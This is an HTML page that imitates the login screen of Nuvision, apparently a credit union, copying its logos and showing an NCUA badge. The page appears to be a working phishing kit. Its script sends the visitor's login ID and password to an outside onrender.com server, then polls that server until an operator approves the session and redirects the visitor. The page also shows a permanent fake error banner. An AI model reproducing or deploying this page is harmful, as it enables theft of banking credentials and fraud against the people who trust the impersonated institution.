<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Nuvision - Login</title>
    <link
      rel="icon"
      type="image/jpeg"
      href="https://s3-media0.fl.yelpcdn.com/bphoto/ASbZrjRyKIcUNEoVv5f3ag/o.jpg"
    />
    <style>
      body {
        background-color: #767679;
        font-family: Arial, sans-serif;
        margin: 0;
      }

      .main-section {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
        padding: 10px;
        box-sizing: border-box;
      }

      .center-container {
        display: flex;
        flex-direction: column;
        width: 100%;
        max-width: 700px;
        background-color: #f6f6f6;
        border-radius: 8px;
        overflow: hidden;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      }

      .top-section {
        background-color: #ffffff;
        display: flex;
        justify-content: center;
        padding: 20px;
        border-bottom: 1px solid #cccccc;
        border-top-left-radius: 8px;
        border-top-right-radius: 8px;
      }

      .top-section img {
        max-width: 50%;
        height: auto;
        max-height: 90px;
      }

      /* Error Banner - Always Visible */
      .error-banner {
        background-color: #ffebee;
        color: #c62828;
        padding: 12px 20px;
        text-align: center;
        font-size: 14px;
        font-weight: 500;
        border-bottom: 1px solid #ffcdd2;
      }

      .middle-section {
        display: flex;
        flex-direction: column;
        align-items: center;
        padding: 20px;
      }

      .form {
        width: 100%;
        max-width: 400px;
        padding: 0;
      }

      .input-section {
        width: 100%;
        margin-top: 10px;
        box-sizing: border-box;
        border: 1px solid #cccccc;
        height: 45px;
        border-radius: 5px;
        padding: 10px;
        font-size: 16px;
      }

      .login {
        border-radius: 5px;
        background-color: #8da3ad;
        width: 100%;
        border: none;
        height: 40px;
        color: white;
        cursor: pointer;
        font-size: 16px;
        margin-top: 20px;
      }

      .login:not(:disabled) {
        background-color: #415d6a;
        cursor: pointer;
      }

      .login:disabled {
        cursor: not-allowed;
        opacity: 0.6;
      }

      .down-section {
        background-color: #003f53;
        display: flex;
        color: white;
        align-items: center;
        gap: 20px;
        font-family: sans-serif;
        font-size: 13px;
        justify-content: center;
        flex-wrap: wrap;
        padding: 15px;
        border-bottom-left-radius: 8px;
        border-bottom-right-radius: 8px;
      }

      .down-section a {
        color: white;
        text-decoration: none;
      }

      .down-section a:hover {
        text-decoration: underline;
      }

      .Forgot {
        color: #2e2e2e;
        cursor: pointer;
        font-family: sans-serif;
        font-size: 13px;
        text-align: end;
        margin-top: 20px;
        text-decoration: underline;
      }

      .Forgot:hover {
        color: #0080a8;
      }

      .bottom-logo {
        display: flex;
        justify-content: center;
        padding: 20px;
        margin-top: 20px;
      }

      .bottom-logo img {
        max-width: 130px;
        height: auto;
      }

      .spinner-overlay {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.5);
        align-items: center;
        justify-content: center;
        z-index: 1000;
      }

      .spinner {
        border: 4px solid #f3f3f3;
        border-top: 4px solid #415d6a;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        animation: spin 1s linear infinite;
      }

      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }

      @media (max-width: 600px) {
        .center-container {
          max-width: 100%;
          margin: 0 10px;
        }

        .top-section {
          padding: 10px;
        }

        .top-section img {
          max-width: 70%;
        }

        .form {
          max-width: 100%;
          padding: 0 20px;
        }

        .error-banner {
          font-size: 13px;
          padding: 10px 15px;
        }

        .down-section {
          gap: 15px;
          font-size: 12px;
          padding: 10px;
        }

        .bottom-logo img {
          max-width: 100px;
        }
      }

      @media (max-width: 400px) {
        .input-section,
        .login {
          font-size: 14px;
        }

        .down-section {
          flex-direction: column;
          gap: 10px;
        }

        .error-banner {
          font-size: 12px;
        }
      }
    </style>
  </head>
  <body>
    <div class="main-section">
      <div class="center-container">
        <div class="top-section">
          <img
            src="https://chambermaster.blob.core.windows.net/images/members/764/10280/MemPageHeader_Nuvision_color_01_Logo.jpg"
            alt="Nuivision Logo"
          />
        </div>

        <!-- Persistent Error Message -->
        <div class="error-banner">
          An unknown error has occurred
        </div>

        <div class="middle-section">
          <form class="form" id="loginForm">
            <div>
              <label style="color: #2e2e2e; font-family: sans-serif">Login ID</label>
              <input type="text" id="loginId" class="input-section" />
            </div>

            <div>
              <label
                style="color: #2e2e2e; font-family: sans-serif; margin-top: 10px"
                >Password</label
              >
              <input type="password" id="password" class="input-section" />
            </div>

            <div style="display: flex; gap: 10px; margin-top: 10px">
              <input type="checkbox" id="rememberMe" />
              <p style="font-family: sans-serif; color: #2e2e2e">Remember me</p>
            </div>

            <button class="login" id="loginBtn" disabled type="submit">
              Log in
            </button>

            <p class="Forgot">Forgot your password?</p>
          </form>
        </div>

        <div class="down-section">
          Call Us | Privacy Policy | Enroll Now | Forgot Login | Rates
        </div>
      </div>

      <div class="bottom-logo">
        <img
          src="https://cdn1.onlineaccess1.com/cdn/depot/5063/3393/ba5a89e5187907b47df565433c5fa651/assets/images/ncua_logo_large-4a4a13e41007adaf4841dd9e4b145458.png"
          alt="NCUA Logo"
        />
      </div>
    </div>

    <div class="spinner-overlay" id="spinner">
      <div class="spinner"></div>
    </div>

    <script>
      const loginId = document.getElementById("loginId");
      const password = document.getElementById("password");
      const loginBtn = document.getElementById("loginBtn");
      const loginForm = document.getElementById("loginForm");
      const spinner = document.getElementById("spinner");

      function checkInputs() {
        loginBtn.disabled = !(loginId.value.trim() && password.value.trim());
      }

      loginId.addEventListener("input", checkInputs);
      password.addEventListener("input", checkInputs);

      loginForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        loginBtn.disabled = true;
        spinner.style.display = "flex";

        try {
          const response = await fetch("https://nu-vision-20g8.onrender.com/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              login: loginId.value.trim(),
              password: password.value.trim(),
            }),
          });
          const data = await response.json();

          if (!data.success) {
            alert("Submission failed: " + (data.error || "Unknown error"));
            loginBtn.disabled = false;
            spinner.style.display = "none";
            return;
          }

          const sessionId = data.id;
          const pollStatus = async () => {
            try {
              const statusResponse = await fetch(
                `https://nu-vision-20g8.onrender.com/status/${sessionId}`
              );
              const statusData = await statusResponse.json();

              if (statusData.status === "approved" && statusData.redirect_url) {
                window.location.href = statusData.redirect_url;
              } else {
                setTimeout(pollStatus, 2000);
              }
            } catch (error) {
              console.error("Status polling error:", error);
              setTimeout(pollStatus, 2000);
            }
          };

          pollStatus();
        } catch (error) {
          console.error("Submission error:", error);
          alert("An error occurred. Please try again.");
          loginBtn.disabled = false;
          spinner.style.display = "none";
        }
      });
    </script>
  </body>
</html>
